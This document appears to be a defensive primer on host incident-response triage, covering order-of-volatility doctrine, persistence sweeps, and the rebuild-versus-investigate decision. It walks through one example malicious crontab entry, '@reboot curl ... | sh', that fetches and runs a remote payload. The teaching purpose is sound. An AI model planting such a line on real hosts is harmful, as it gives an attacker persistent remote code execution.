# DFIR Triage — Background Primer

Optional depth layer for `../SKILL.md`. Zero-internet reading: no links
required, no tooling assumed, no prior security background assumed. This file
teaches the *why* behind volatile-first capture, session forensics, persistence
and webshell sweeps, and the rebuild-versus-investigate decision; SKILL.md
carries the commands, artifact paths, and indicator batteries.

This module remaps the standard audit headings (its Adaptation Note says so):
What To Check is an ORDERED TRIAGE SEQUENCE, Where To Look means artifact paths
on disk, Exploitation & Reproduction means lab-only tabletop drills, and
Severity means incident impact feeding SEV1–SEV4. Everything below aligns.

## How host triage emerged

Digital forensics predates "cybersecurity" as a profession — investigators
were recovering evidence from computers for fraud and crime cases in the
1980s — but responding to LIVE intrusions forced a painful discovery:
traditional forensics assumed you could seize the machine and analyze it at
leisure, while a compromised server under attack loses its best evidence by
the minute.

- **The coroner metaphor (turn of the millennium).** Around 1999–2000,
  security researchers Dan Farmer and Wietse Venema released The Coroner's
  Toolkit, a collection of Unix utilities for post-mortem analysis of
  compromised hosts, and their book *Forensic Discovery* popularized treating
  intrusion investigation like death investigation: work from remains and
  traces, not confessions. The name stuck across the field.
- **Order of volatility was codified (2002).** RFC 3227, "Guidelines for
  Evidence Collection and Archiving" (February 2002), gave responders the
  doctrine this module's central table follows: collect from the most
  ephemeral state first — network connections and memory die on reboot; disk
  survives longer; backups longest. Responders learned it the hard way first.
- **Forensics joined incident response (2006).** NIST SP 800-86 integrated
  forensic techniques into the incident-response lifecycle, formalizing
  collection, examination, analysis, and reporting as distinct steps with
  chain-of-custody discipline — the ancestor of this module's responder-log
  requirement.
- **Memory forensics matured (mid-2000s).** Community research challenges
  (the DFRWS conference era) produced techniques to parse RAM dumps for
  hidden processes and injected code, crystallizing into the open-source
  Volatility Framework. The lesson was uncomfortable: disk alone lies, because
  kernel-level malware can hide anything on it — memory is ground truth.
- **The cloud and container era changed the economics (2010s–today).**
  Snapshots made full-state preservation cheap — one API call — while reboots
  became catastrophic for evidence (ephemeral journals, container filesystems,
  rescheduled pods). Simultaneously, small teams without EDR platforms still
  needed answers in the first hours: exactly the niche built-in Unix
  primitives fill. This module assumes SSH access and nothing else installed.

The recurring lesson: triage exists because full forensic analysis is too slow
to stop an active incident. Its craft is extracting defensible answers in the
first hour or two WITHOUT destroying what deeper investigation would later
need.

## Anatomy: one suspicious cron line

The minimal unit of triage is a single artifact plus the questions it forces.
Here is the generic shape of a bad find:

```
# root's crontab, found during persistence sweep:
@reboot curl -s http://203.0.113.9/x.tgz | sh
```

Walkthrough of what disciplined triage does with that line:

1. **Freeze first.** No deleting, no killing, no "obvious cleanup." The line
   is evidence of HOW attacker access persists; destroying it destroys the
   ability to prove anything later. Start the responder log — timestamped,
   UTC, on YOUR laptop, never the suspect host.
2. **Capture outward.** Everything about the host worth keeping gets streamed
   off-host over SSH to your collector: socket maps, process trees, session
   histories, the cron files themselves, hashed manifests on arrival. Nothing
   writes onto the suspect disk — every write mutates metadata that timestamps
   would otherwise testify about.
3. **Attribute.** When did that cron file change? An mtime hunt anchored to
   the incident window finds sibling artifacts modified in the same minutes —
   often including the webshell or stolen key that got the attacker in.
   Correlate auth logs for logins just before the mtime anchor.
4. **Correlate execution.** Did the payload actually run? Shell history,
   journal entries, and outbound connection records answer; a cron entry that
   never fired changes the story from compromise to attempted planting.
5. **Read the lateral chain.** A cron payload implies egress; egress implies
   possibly OTHER hosts fetching the same URL. One artifact always implicates
   a next hop — keys fingerprint-searched across the fleet, URLs grepped in
   proxy logs — until the chain ends at infrastructure you control (rotate)
   or do not (hand indicators to IR).
6. **Decide nuke-vs-investigate.** You cannot prove the absence of a kernel
   rootkit on a suspect box; you CAN prove a fresh build from infrastructure-
   as-code is clean. Default verdict: preserve evidence, rebuild from clean
   sources, rotate everything the host could see — credentials included,
   because anything readable from that host must be considered burned.
7. **Close the loop.** Indicators go into detection rules so a repeat trip
   pages someone; the entry-vector class feeds back to whichever audit module
   owns that weakness class.

Notice what triage did NOT do: reverse-engineer malware, image every sector,
or identify the human attacker — those are follow-on activities. Triage's
contract is narrower and achievable: prove or disprove compromise, preserve
the record, scope the blast radius, recommend action.

## Why naive approaches fail

- **Kill-it-quick remediation.** Killing the "obviously evil" process deletes
  the best evidence of what it was doing; deleting the webshell forfeits the
  upload-request correlation that identifies the operator. Remediation before
  capture converts an investigation into a guessing game.
- **Investigating on the suspect host with local tools.** Writing dumps to
  local disk mutates the very timeline you are reconstructing, and any tool
  output an attacker can see invites them to adapt. Capture streams outward
  or it contaminates.
- **Rebooting to "clear it out."** Reboot erases memory, live sockets, and
  often journald history on minimal images — while leaving every persistence
  mechanism intact, because cron jobs and SSH keys survive reboots by design.
  It is simultaneously destructive and ineffective.
- **Trusting negative scans as innocence.** Userland checks catch lazy
  rootkits only; a kernel-mode implant hides from every command run ON the
  compromised kernel itself. Clean results narrow the story; they never prove
  cleanliness. That epistemic limit is why rebuild-from-clean is the default.
- **Cleaning in place as the endgame.** Removing found implants leaves the
  unknown ones — and there are always unknown ones until proven otherwise.
  Eradication theater looks done and reopens within days.
- **Skipping the known-good baseline question.** Half of "suspicious" is only
  suspicious relative to expectations: which admins SHOULD appear in auth
  logs, which destinations SHOULD appear in sockets. Without asking service
  owners first, noise drowns signal and benign admin keys look identical to
  attacker keys.
- **Treating triage as the whole investigation.** The lite timeline and grep
  batteries answer the urgent questions; they do not replace super-timelines,
  malware analysis, or legal-grade custody when a case escalates. Knowing
  where triage ENDS is part of the discipline.

## Common misconceptions

1. "Rebooting fixes it." Reboot destroys volatile evidence and leaves all
   persistence mechanisms untouched. It is the single most harmful reflex in
   the field.
2. "If my scanner finds nothing, we're fine." Absence of findings from
   userland checks on a compromised kernel proves little; SKILL.md frames its
   own rootkit section honestly for exactly this reason.
3. "Deleted files are gone." Deletion unlinks names, not data: running
   processes keep deleted binaries mapped (`/proc/<pid>/exe` shows `(deleted)`
   — itself a red-flag signature), and disk slack survives until overwritten.
   Attackers who know this timestomp instead; mtime anomalies catch that too.
4. "Logs tell the whole story." Logs rotate, get scrubbed, and may be volatile
   on minimal systems. They are ONE artifact family among several — process,
   socket, and filesystem metadata frequently contradict or complete them.
5. "Rootkits mean you can never respond." You cannot get truth FROM a
   subverted kernel, but you don't have to: capture outward, then trust a
   fresh build. The asymmetry favors defenders who rebuild.
6. "Cloud snapshots replace forensic method." A snapshot preserves state but
   answers nothing by itself; ordering still matters (snapshot BEFORE reboot,
   after volatile capture) and interpretation still requires the same
   artifact reasoning.
7. "Chain of custody is lawyer decoration." The responder log costs one line
   per action and is what makes findings DEFENSIBLE — to executives, insurers,
   counsel, or the next responder — instead of anecdotal.

## How professionals think about it today

Modern triage reads the host as four artifact families interrogated in strict
order; SKILL.md's steps map onto them directly, and every finding lands in
one cell.

| Layer | Sub-types in this module | What it answers |
|---|---|---|
| Volatile capture | sockets → processes/memory → sessions → scheduled jobs | Who is connected and running RIGHT NOW, before it dies |
| Identity & access | auth logs, wtmp/btmp, authorized_keys inventory, sudo/su trails, account anomalies | How did they get in and who else has keys |
| Persistence | cron/at, systemd units+timers, boot/shell hooks, SSH config tampering, containers/k8s autostart, ld.so.preload | What keeps them in across reboots |
| Application & timeline | webroot mtime sweeps, webshell combo regexes, POST-to-new-file correlation, lite merged timeline | What ran, when, through which entry vector |

Cross-cutting disciplines: externalize-everything capture with hash
manifests; indicator-shape thinking (a decode primitive PLUS exec primitive
PLUS request-input access is a verdict, where any single pattern is merely a
lead); false-positive dismissal with logged evidence (distro-owned cron,
package-verified drift, break-glass keys); and the explicit severity floor
rules feeding the SEV matrix — interactive attacker session observed, or
tunnel/node trust loss, floors at SEV2 regardless of other findings.

## Read next

In `../SKILL.md`: **Adaptation note**, **Scope & Objectives**, **Prerequisites
& Vocabulary**, **Mental Model** (golden rules, order-of-volatility table,
responder log template), **What To Check** (Steps 0–7), **Where To Look**
(consolidated artifact map), **Patterns & Signatures** (webshell battery,
deleted-binary signature, key/cron/access-log shapes), **Taint Tracing
Guidance** (lateral-movement table), **Exploitation & Reproduction** (lab-only
canary drills), **Remediation** (rebuild-from-IaC default, rotation cascade),
**Verification & Validation**, **Severity Assessment**, **Common False
Positives**, **References**.

Sibling modules in operations/: `../incident-response/SKILL.md` (the SEV matrix
and orchestration this hands off to), `../blue-team-detection/SKILL.md` (where
this case's indicators become standing detections), `../vuln-mgmt-process/SKILL.md`
(how the underlying weaknesses get fixed on cadence). Closest companions
elsewhere: code skillset `injection`, `file-handling`, `ssrf-url-security`
(entry-vector classes) and `secrets-data-exposure` (credential sweep + rotation
detail); server skillset `logging-monitoring` (telemetry retention bounds how
far back you can see).
